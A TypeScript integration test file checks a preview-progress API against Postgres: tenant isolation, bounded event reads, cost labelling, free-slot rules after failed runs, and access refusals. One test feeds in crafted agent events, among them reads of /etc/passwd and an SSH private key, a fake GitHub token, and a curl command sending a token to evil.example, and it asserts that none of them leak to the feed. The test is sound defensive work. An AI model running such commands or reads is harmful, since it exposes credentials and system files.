import { randomInt, randomUUID } from 'node:crypto';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Pool, PoolClient } from 'pg';
import { createPool } from '@fx/db/src/pool.js';
import { RUN_WRITER_TEST_LOGIN, createRunWriterTestLogin, runWriterUrlFrom } from '@fx/db/test/support/run-writer-login.js';
import { seedAccount, type SeedRefs } from '@fx/db/test/helpers/seed.js';
import { createRecordingRunActionSignal } from '../src/runActions/index.js';
import { PROGRESS_LIMITS, PreviewExistsError, getPreviewProgress, requestPreview } from '../src/onboarding/index.js';
import { ForbiddenError, NotFoundError } from '../src/tenancy/errors.js';
import { withTenant } from '../src/tenancy/withTenant.js';

/** D#2 PREVIEW-LIVE-PROGRESS: the progress read against real Postgres (RLS, the role gate, bounded reads, honest numbers). */
describe('getPreviewProgress (pg)', () => {
  let adminPool: Pool;
  let admin: PoolClient;
  let appPool: Pool;
  let runnerPool: Pool;
  let a: SeedRefs;
  let b: SeedRefs;
  const now = new Date();

  beforeAll(async () => {
    adminPool = createPool(process.env.DATABASE_URL!);
    admin = await adminPool.connect();
    appPool = createPool(process.env.DATABASE_URL_APP_USER!);
    await createRunWriterTestLogin(process.env.DATABASE_URL!);
    runnerPool = createPool(runWriterUrlFrom(process.env.DATABASE_URL_APP_USER!));
    a = await seedAccount(admin, randomUUID());
    b = await seedAccount(admin, randomUUID());
    await admin.query(`UPDATE model_connections SET status = 'ok' WHERE account_id = $1`, [a.accountId]);
  });
  afterAll(async () => {
    admin.release();
    await adminPool.end();
    await appPool.end();
    await runnerPool.end();
  });

  const ctx = (r: SeedRefs = a, userId = r.userId) => ({ pool: appPool, principal: { accountId: r.accountId, userId } });
  const deps = (over: object = {}) => ({ estimateComputeUsd: (s: number) => s / 1000, now: () => new Date(now.getTime() + 60_000), ...over });

  async function requested(r: SeedRefs = a): Promise<string> {
    const inst = randomUUID();
    const repoId = randomUUID();
    const gh = randomInt(1, 2_000_000_000);
    await admin.query(`INSERT INTO installations (id, account_id, gh_installation_id, app_kind) VALUES ($1, $2, $3, 'team_readonly')`, [inst, r.accountId, gh]);
    await admin.query(`INSERT INTO repos (id, account_id, installation_id, gh_repo_id, product, gh_owner, gh_name) VALUES ($1, $2, $3, 1, 'team', $4, 'widgets')`, [repoId, r.accountId, inst, `o${gh}`]);
    await admin.query(`INSERT INTO installation_installers (gh_installation_id, app_kind, installer_gh_user_id) VALUES ($1, 'team_readonly', $2)`, [gh, randomInt(1, 2_000_000_000)]);
    const res = await requestPreview(ctx(r), { repoId, confirmModelCapUsd: 20 }, { signal: createRecordingRunActionSignal(), available: () => true });
    return res.previewId;
  }
  /** A preview linked to a fresh run of its own (so each test owns its events). */
  async function running(r: SeedRefs = a): Promise<{ previewId: string; runId: string }> {
    const previewId = await requested(r);
    const runId = randomUUID();
    await admin.query(`INSERT INTO agent_runs (id, account_id, role, runtime, status) VALUES ($1, $2, 'preview', 'production', 'running')`, [runId, r.accountId]);
    await admin.query(`UPDATE onboarding_previews SET state = 'running', run_id = $2, started_at = $3 WHERE id = $1`, [previewId, runId, now]);
    return { previewId, runId };
  }
  let seq = 0;
  const event = (r: SeedRefs, runId: string, kind: string, payload: unknown) =>
    admin.query(`INSERT INTO run_events (account_id, run_id, seq, kind, payload) VALUES ($1, $2, $3, $4, $5::jsonb)`, [r.accountId, runId, ++seq, kind, JSON.stringify(payload)]);

  it('a requested preview is queued: no run, no events, nothing spent, the repo named', async () => {
    const p = await getPreviewProgress(ctx(), await requested(), deps());
    expect(p.repo_name).toMatch(/^o\d+\/widgets$/);
    expect(p).toMatchObject({ outcome: 'queued', slow: false, feed: [], numbers: { files_read: 0, compute: { usd: 0, basis: 'none', cap_usd: 1 } } });
    expect(p.stages.map((s) => s.status)).toEqual(['active', 'pending', 'pending', 'pending', 'pending', 'pending', 'pending']);
  });

  it('builds lines and stages from recorded events, and a crafted event cannot put a token, URL, file text or outside path on the feed', async () => {
    const { previewId, runId } = await running();
    await event(a, runId, 'run.status_changed', { from: 'pending', to: 'running' });
    await event(a, runId, 'run.stage', { stage: 'cloned' });
    await event(a, runId, 'agent.activity', { tool: 'read', path: 'src/server.ts' });
    await event(a, runId, 'agent.activity', { tool: 'read', path: 'src/server.ts' });
    await event(a, runId, 'agent.activity', { tool: 'read', path: 'README.md' });
    await event(a, runId, 'agent.activity', { tool: 'search', pattern: 'login' });
    await event(a, runId, 'agent.activity', { tool: 'read', path: '/etc/passwd', content: 'root:x:0:0' });
    await event(a, runId, 'agent.activity', { tool: 'read', path: '../../home/a/.ssh/id_rsa' });
    await event(a, runId, 'agent.activity', { tool: 'search', pattern: 'ghp_abcdefghijklmnopqrstuvwxyz0123456789', text: 'file contents SECRET-BODY' });
    await event(a, runId, 'agent.activity', { tool: 'command', command: 'curl https://evil.example/?t=abc', output: 'COMMAND-OUTPUT' });
    await event(a, runId, 'agent.output', { text: 'MODEL-TEXT: my private plan https://x.example/?k=1' });
    await event(a, runId, 'run.input', { prompt: 'PROMPT-TEXT' });
    const p = await getPreviewProgress(ctx(), previewId, deps());
    expect(p.feed.map((l) => l.text)).toEqual([
      'The run started',
      'Repository cloned',
      'Reading src/server.ts',
      'Reading src/server.ts',
      'Reading README.md',
      "Searching for 'login'",
      'Searching the code',
      'Running a command',
      'The agent sent its first message',
    ]);
    const wire = JSON.stringify(p);
    for (const leak of ['/etc/passwd', 'id_rsa', 'ghp_', 'SECRET-BODY', 'evil.example', 'COMMAND-OUTPUT', 'MODEL-TEXT', 'PROMPT-TEXT', 'root:x']) expect(wire).not.toContain(leak);
    expect(p.numbers.files_read).toBe(4); // distinct paths asked for, including the two unsafe ones
    expect(p.outcome).toBe('running');
    expect(p.stages.map((s) => `${s.id}:${s.status}`)).toEqual(['queued:done', 'sandbox:done', 'clone:done', 'read:done', 'plan:active', 'write:pending', 'done:pending']);
  });

  it('is bounded: a run with a thousand events returns the newest 30 lines and scans a bounded page', async () => {
    const { previewId, runId } = await running();
    await admin.query(
      `INSERT INTO run_events (account_id, run_id, seq, kind, payload)
       SELECT $1, $2, 10000 + s, 'agent.activity', jsonb_build_object('tool', 'read', 'path', 'src/f' || s || '.ts') FROM generate_series(1, 1000) s`,
      [a.accountId, runId],
    );
    const p = await getPreviewProgress(ctx(), previewId, deps());
    expect(p.feed).toHaveLength(PROGRESS_LIMITS.maxLines);
    expect(p.feed.at(-1)?.text).toBe('Reading src/f1000.ts');
    expect(p.numbers.files_read).toBe(1000);
  });

  it('an event of another run, or of another account, never appears', async () => {
    const mine = await running();
    const other = await running();
    await event(a, other.runId, 'agent.activity', { tool: 'read', path: 'only/in/other.ts' });
    expect((await getPreviewProgress(ctx(), mine.previewId, deps())).feed.map((l) => l.text)).not.toContain('Reading only/in/other.ts');
  });

  it('numbers: compute is an estimate while running and recorded once the ledger has it, and is never zero-labelled as free', async () => {
    const { previewId, runId } = await running();
    const live = await getPreviewProgress(ctx(), previewId, deps());
    expect(live.numbers.compute).toEqual({ usd: 0.06, basis: 'estimate', cap_usd: 1 });
    await admin.query(`INSERT INTO ledger (account_id, kind, source, usd, run_id, budget) VALUES ($1, 'compute', 'sandbox', 0.0321, $2, 'foreground_compute')`, [a.accountId, runId]);
    await admin.query(`INSERT INTO ledger (account_id, kind, source, usd, run_id, budget) VALUES ($1, 'model', 'customer_gateway', 0.42, $2, 'model')`, [a.accountId, runId]);
    const settled = await getPreviewProgress(ctx(), previewId, deps());
    expect(settled.numbers.compute).toEqual({ usd: 0.0321, basis: 'recorded', cap_usd: 1 });
    expect(settled.numbers.model).toEqual({ whose: 'ai_gateway', usd: 0.42 });
  });

  it('model usage is labelled by whose it is: the key provider before any usage, the operator subscription for our own accounts', async () => {
    const { previewId } = await running();
    await admin.query(`UPDATE model_connections SET provider = 'anthropic' WHERE account_id = $1`, [a.accountId]);
    expect((await getPreviewProgress(ctx(), previewId, deps())).numbers.model).toEqual({ whose: 'anthropic', usd: 0 });
    await admin.query(`UPDATE model_connections SET provider = 'ai_gateway' WHERE account_id = $1`, [a.accountId]);
    expect((await getPreviewProgress(ctx(), previewId, deps())).numbers.model).toEqual({ whose: 'ai_gateway', usd: 0 });
    expect((await getPreviewProgress(ctx(), previewId, deps({ isOperatorAccount: () => true }))).numbers.model).toEqual({ whose: 'operator', usd: null });
  });

  /** Records the run's failure the way the runner does: a status event carrying the reason, and the run set to failed. */
  async function fail(runId: string, failureReason: string | null, agentMessages = 0, status = 'failed') {
    for (let i = 0; i < agentMessages; i++) await event(a, runId, 'agent.output', { text: 'x' });
    await event(a, runId, 'run.status_changed', { from: 'running', to: status, ...(failureReason ? { failureReason } : {}) });
    await admin.query(`UPDATE agent_runs SET status = $2 WHERE id = $1`, [runId, status]);
  }
  const stateOf = async (previewId: string) => (await admin.query(`SELECT state, void_reason, run_id FROM onboarding_previews WHERE id = $1`, [previewId])).rows[0] as { state: string; void_reason: string | null; run_id: string | null };

  it('end states come from the run: succeeded, failed, cancelled, sandbox lost', async () => {
    const outcomeOf = async (status: string, reason: string | null) => {
      const { previewId, runId } = await running();
      await fail(runId, reason, 0, status);
      return getPreviewProgress(ctx(), previewId, deps());
    };
    expect(await outcomeOf('succeeded', null)).toMatchObject({ outcome: 'finished', slot_freed: false });
    expect(await outcomeOf('failed', 'model_key_broken')).toMatchObject({ outcome: 'failed', reason: 'model_key_broken', slot_freed: false });
    expect(await outcomeOf('cancelled', null)).toMatchObject({ outcome: 'cancelled', slot_freed: false });
    expect(await outcomeOf('failed', 'runner_lost')).toMatchObject({ outcome: 'sandbox_stopped', slot_freed: false });
  });

  // ---- The free slot. The failure is written the way production writes it: as the runner login (a member of
  // app_user and agent_run_writer, not a superuser), through withTenant. A superuser would skip the preview write guard.
  const reqDeps = () => ({ signal: createRecordingRunActionSignal(), available: () => true });
  async function makeRepo(r: SeedRefs, owner: string): Promise<string> {
    const inst = randomUUID();
    const repoId = randomUUID();
    const gh = randomInt(1, 2_000_000_000);
    await admin.query(`INSERT INTO installations (id, account_id, gh_installation_id, app_kind) VALUES ($1, $2, $3, 'team_readonly')`, [inst, r.accountId, gh]);
    await admin.query(`INSERT INTO repos (id, account_id, installation_id, gh_repo_id, product, gh_owner, gh_name) VALUES ($1, $2, $3, 1, 'team', $4, 'widgets')`, [repoId, r.accountId, inst, owner]);
    await admin.query(`INSERT INTO installation_installers (gh_installation_id, app_kind, installer_gh_user_id) VALUES ($1, 'team_readonly', $2)`, [gh, randomInt(1, 2_000_000_000)]);
    return repoId;
  }
  /** Requests a preview on a repo and links it to a fresh running run (as the worker does). */
  async function startOn(r: SeedRefs, repoId: string): Promise<{ previewId: string; runId: string }> {
    const { previewId } = await requestPreview(ctx(r), { repoId, confirmModelCapUsd: 20 }, reqDeps());
    const runId = randomUUID();
    await admin.query(`INSERT INTO agent_runs (id, account_id, role, runtime, status) VALUES ($1, $2, 'preview', 'production', 'running')`, [runId, r.accountId]);
    await admin.query(`UPDATE onboarding_previews SET state = 'running', run_id = $2, started_at = now() WHERE id = $1`, [previewId, runId]);
    return { previewId, runId };
  }
  /** Records a run failure as the runner login does: the status event carrying the reason, in a tenant transaction. */
  async function failAsRunner(r: SeedRefs, runId: string, failureReason: string, activity = 0) {
    await withTenant(runnerPool, r.accountId, async (client) => {
      for (let i = 0; i < activity; i++) {
        await client.query(`INSERT INTO run_events (account_id, run_id, seq, kind, payload) VALUES ($1, $2, $3, 'agent.activity', $4::jsonb)`, [r.accountId, runId, ++seq, JSON.stringify({ tool: 'read', path: `src/f${i}.ts` })]);
      }
      await client.query(`INSERT INTO run_events (account_id, run_id, seq, kind, payload) VALUES ($1, $2, $3, 'run.status_changed', $4::jsonb)`, [r.accountId, runId, ++seq, JSON.stringify({ from: 'running', to: 'failed', failureReason })]);
    });
    await admin.query(`UPDATE agent_runs SET status = 'failed' WHERE id = $1`, [runId]);
  }
  const owner = () => `o${randomInt(1, 2_000_000_000)}`;

  it('the runner login can write a failure (the premise of the tests below), and is not a superuser', async () => {
    const who = (await runnerPool.query(`SELECT current_user AS u, (SELECT rolsuper FROM pg_roles WHERE rolname = current_user) AS su`)).rows[0];
    expect(who.su).toBe(false);
    expect(who.u).toBe(RUN_WRITER_TEST_LOGIN);
  });

  it('agent never started, as a real start timeout leaves it: a failed run with the reason on its event; the preview is voided and the slot freed', async () => {
    const { previewId, runId } = await startOn(a, await makeRepo(a, owner()));
    await event(a, runId, 'agent.activity', { tool: 'read', path: 'x.ts' }); // earlier activity is not what decides it
    await failAsRunner(a, runId, 'agent_start_timeout');
    expect(await stateOf(previewId)).toMatchObject({ state: 'void', void_reason: 'agent_start_timeout' });
    await admin.query(`INSERT INTO ledger (account_id, kind, source, usd, run_id, budget) VALUES ($1, 'compute', 'sandbox', 0.0105, $2, 'foreground_compute')`, [a.accountId, runId]);
    const p = await getPreviewProgress(ctx(), previewId, deps());
    expect(p).toMatchObject({ outcome: 'agent_never_started', reason: 'agent_start_timeout', slot_freed: true, numbers: { compute: { usd: 0.0105, basis: 'recorded' } } });
    expect(p.elapsed_seconds).not.toBeNull();
  });

  it('the slot rule: only a failure that cannot happen once the agent runs frees the free preview', async () => {
    const cases: Array<[string, number, boolean]> = [
      ['agent_start_timeout', 0, true],
      ['clone_failed', 0, true],
      ['sandbox_error', 0, false], // also the mid-run implausible-usage kill, so not a proof that no work happened
      ['sandbox_error', 25, false], // 25 file reads and no text message: real work
      ['clone_too_large', 0, false], // the repository is the cause; trying it again fails the same way
      ['runner_lost', 0, false],
      ['model_key_broken', 0, false],
    ];
    for (const [reason, activity, freed] of cases) {
      const { previewId, runId } = await startOn(a, await makeRepo(a, owner()));
      await failAsRunner(a, runId, reason, activity);
      expect((await stateOf(previewId)).state, `${reason} after ${activity} reads`).toBe(freed ? 'void' : 'running');
      expect((await getPreviewProgress(ctx(), previewId, deps())).slot_freed, reason).toBe(freed);
    }
  });

  it('slot_freed is read from the row: a freeing reason the trigger did not act on reads as used up', async () => {
    const { previewId, runId } = await startOn(a, await makeRepo(a, owner()));
    // forged as app_user: the event is written, but app_user holds no UPDATE on previews, so the void is skipped
    await withTenant(appPool, a.accountId, async (client) => {
      await client.query(`INSERT INTO run_events (account_id, run_id, seq, kind, payload) VALUES ($1, $2, $3, 'run.status_changed', $4::jsonb)`, [a.accountId, runId, ++seq, JSON.stringify({ from: 'running', to: 'failed', failureReason: 'agent_start_timeout' })]);
    });
    await admin.query(`UPDATE agent_runs SET status = 'failed' WHERE id = $1`, [runId]);
    expect((await stateOf(previewId)).state).toBe('running');
    expect(await getPreviewProgress(ctx(), previewId, deps())).toMatchObject({ outcome: 'agent_never_started', slot_freed: false });
  });

  it('a skipped void is never silent: it leaves an error_events row (and the event write still succeeds)', async () => {
    const before = Number((await admin.query(`SELECT coalesce(sum(count), 0) AS n FROM error_events WHERE route = '/preview/free_slot'`)).rows[0].n);
    const { runId } = await startOn(a, await makeRepo(a, owner()));
    await withTenant(appPool, a.accountId, async (client) => {
      await client.query(`INSERT INTO run_events (account_id, run_id, seq, kind, payload) VALUES ($1, $2, $3, 'run.status_changed', $4::jsonb)`, [a.accountId, runId, ++seq, JSON.stringify({ from: 'running', to: 'failed', failureReason: 'clone_failed' })]);
    });
    const after = Number((await admin.query(`SELECT coalesce(sum(count), 0) AS n FROM error_events WHERE route = '/preview/free_slot'`)).rows[0].n);
    expect(after).toBe(before + 1);
    expect((await admin.query(`SELECT count(*)::int AS n FROM run_events WHERE run_id = $1 AND kind = 'run.status_changed'`, [runId])).rows[0].n).toBe(1);
  });

  it('the same account can start again on the same repo after a freed slot, and cannot after a used-up one', async () => {
    const ours = await makeRepo(a, owner());
    const first = await startOn(a, ours);
    await failAsRunner(a, first.runId, 'agent_start_timeout');
    await expect(requestPreview(ctx(), { repoId: ours, confirmModelCapUsd: 20 }, reqDeps())).resolves.toMatchObject({ replayed: false });
    const theirs = await makeRepo(a, owner());
    const second = await startOn(a, theirs);
    await failAsRunner(a, second.runId, 'sandbox_error', 1);
    await expect(requestPreview(ctx(), { repoId: theirs, confirmModelCapUsd: 20 }, reqDeps())).rejects.toBeInstanceOf(PreviewExistsError);
  });

  it('the bound: at most 3 previews per installation are freed in a day; the 4th stays used up (and reads that way)', async () => {
    const repo = await makeRepo(a, owner());
    for (let i = 1; i <= 4; i++) {
      const { previewId, runId } = await startOn(a, repo);
      await failAsRunner(a, runId, 'clone_failed');
      expect((await stateOf(previewId)).state, `attempt ${i}`).toBe(i <= 3 ? 'void' : 'running');
      expect((await getPreviewProgress(ctx(), previewId, deps())).slot_freed, `attempt ${i}`).toBe(i <= 3);
      if (i === 4) await expect(requestPreview(ctx(), { repoId: repo, confirmModelCapUsd: 20 }, reqDeps())).rejects.toBeInstanceOf(PreviewExistsError);
    }
  });

  it('the bound also holds per GitHub owner across accounts', async () => {
    await admin.query(`UPDATE model_connections SET status = 'ok' WHERE account_id = $1`, [b.accountId]);
    const shared = owner();
    for (let i = 0; i < 3; i++) {
      const { runId } = await startOn(a, await makeRepo(a, shared)); // a different installation each time, the same owner
      await failAsRunner(a, runId, 'agent_start_timeout');
    }
    const { previewId, runId } = await startOn(b, await makeRepo(b, shared));
    await failAsRunner(b, runId, 'agent_start_timeout');
    expect((await stateOf(previewId)).state).toBe('running');
    expect((await getPreviewProgress(ctx(b), previewId, deps())).slot_freed).toBe(false);
  });

  it('the day\'s compute cap counts what a pre-agent failure MEASURED once settled, not its $1 reservation: ten of them from one account leave room for another', async () => {
    await admin.query(`UPDATE model_connections SET status = 'ok' WHERE account_id = $1`, [b.accountId]);
    const used = async () => Number((await admin.query('SELECT preview_daily_compute_usd() AS v')).rows[0].v);
    const base = await used();
    const reserve = async (settledUsd: number | null) => {
      const runId = randomUUID();
      await admin.query(`INSERT INTO agent_runs (id, account_id, role, runtime, status) VALUES ($1, $2, 'preview', 'production', 'failed')`, [runId, a.accountId]);
      await admin.query(`INSERT INTO spend_reservations (account_id, run_id, usd_reserved, state, budget, purpose) VALUES ($1, $2, 1, 'open', 'foreground_compute', 'preview')`, [a.accountId, runId]);
      if (settledUsd !== null) {
        await admin.query(`INSERT INTO ledger (account_id, kind, source, usd, run_id, budget, compute_basis) VALUES ($1, 'compute', 'sandbox', $2, $3, 'foreground_compute', 'measured')`, [a.accountId, settledUsd, runId]);
        await admin.query(`UPDATE spend_reservations SET state = 'settled' WHERE run_id = $1`, [runId]);
      }
    };
    // Open: each holds its whole reservation until it settles.
    await reserve(null);
    expect(await used()).toBeCloseTo(base + 1, 4);
    // Ten pre-agent failures, each settled at its measured figure (a clone that failed after a few seconds).
    for (let i = 0; i < 10; i++) await reserve(0.01);
    expect(await used()).toBeCloseTo(base + 1 + 0.1, 4);
    // A sandbox that was never started settles at zero ('no_sandbox'), and counts nothing.
    const none = randomUUID();
    await admin.query(`INSERT INTO agent_runs (id, account_id, role, runtime, status) VALUES ($1, $2, 'preview', 'production', 'failed')`, [none, a.accountId]);
    await admin.query(`INSERT INTO spend_reservations (account_id, run_id, usd_reserved, state, budget, purpose) VALUES ($1, $2, 1, 'open', 'foreground_compute', 'preview')`, [a.accountId, none]);
    await admin.query(`INSERT INTO ledger (account_id, kind, source, usd, run_id, budget, compute_basis) VALUES ($1, 'compute', 'sandbox', 0, $2, 'foreground_compute', 'no_sandbox')`, [a.accountId, none]);
    await admin.query(`UPDATE spend_reservations SET state = 'settled' WHERE run_id = $1`, [none]);
    expect(await used()).toBeCloseTo(base + 1 + 0.1, 4);
    // So another account can still start a preview on a day where it would otherwise be turned away.
    expect(base + 1.1).toBeLessThan(10);
    const repoId = await makeRepo(b, owner());
    await expect(requestPreview(ctx(b), { repoId, confirmModelCapUsd: 20 }, reqDeps())).resolves.toMatchObject({ replayed: false });
  });

  it('a void preview with no run is a plain void', async () => {
    const id = await requested();
    await admin.query(`UPDATE onboarding_previews SET state = 'void', void_reason = 'preview_unavailable' WHERE id = $1`, [id]);
    expect(await getPreviewProgress(ctx(), id, deps())).toMatchObject({ outcome: 'void', reason: 'preview_unavailable', elapsed_seconds: null });
  });

  it('access: another account, a member, a token and a malformed id are all refused; nothing is written', async () => {
    const { previewId, runId } = await running();
    await expect(getPreviewProgress(ctx(b), previewId, deps())).rejects.toBeInstanceOf(NotFoundError);
    await expect(getPreviewProgress(ctx(), 'not-a-uuid', deps())).rejects.toBeInstanceOf(NotFoundError);
    await expect(getPreviewProgress(ctx(), randomUUID(), deps())).rejects.toBeInstanceOf(NotFoundError);
    const memberId = randomUUID();
    await admin.query(`INSERT INTO users (id, email) VALUES ($1, $2)`, [memberId, `${memberId}@example.test`]);
    await admin.query(`INSERT INTO account_members (account_id, user_id, role) VALUES ($1, $2, 'member')`, [a.accountId, memberId]);
    await expect(getPreviewProgress(ctx(a, memberId), previewId, deps())).rejects.toBeInstanceOf(ForbiddenError);
    const token = { pool: appPool, principal: { accountId: a.accountId, userId: a.userId, tokenId: randomUUID() } };
    await expect(getPreviewProgress(token, previewId, deps())).rejects.toBeInstanceOf(ForbiddenError);
    const before = (await admin.query(`SELECT (SELECT count(*)::int FROM run_events WHERE run_id = $1) e, (SELECT count(*)::int FROM onboarding_previews WHERE account_id = $2) p`, [runId, a.accountId])).rows[0];
    await getPreviewProgress(ctx(), previewId, deps());
    const after = (await admin.query(`SELECT (SELECT count(*)::int FROM run_events WHERE run_id = $1) e, (SELECT count(*)::int FROM onboarding_previews WHERE account_id = $2) p`, [runId, a.accountId])).rows[0];
    expect(after).toEqual(before);
  });
});
